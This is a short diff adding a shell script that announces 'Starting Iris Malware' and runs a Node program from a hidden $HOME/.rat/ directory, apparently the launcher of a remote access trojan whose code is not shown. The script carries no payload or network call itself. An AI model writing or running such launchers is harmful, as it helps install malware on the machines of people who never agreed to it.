@@ -1,0 +1,4 @@
+echo "Starting Iris Malware"
+echo "CTRL+C FOR STOP"
+cd $HOME/.rat/
+node index.js
